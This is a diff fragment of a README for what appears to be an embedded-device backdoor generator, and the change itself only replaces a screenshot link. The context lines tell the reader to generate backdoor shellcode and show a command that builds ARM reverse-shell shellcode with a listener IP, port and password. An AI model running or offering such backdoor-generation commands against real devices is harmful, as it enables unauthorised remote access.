@@ -42,7 +42,7 @@ apt install binutils-arm-linux-gnueabi/hirsute
 
 1. Use the command line to generate the backdoor file name, shellcode, binshell, etc
 
-   ![image-20221102192432828](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102192432828.png)
+   ![image-20221102192550052](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102192550052.png)
 
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode -passwd 1231
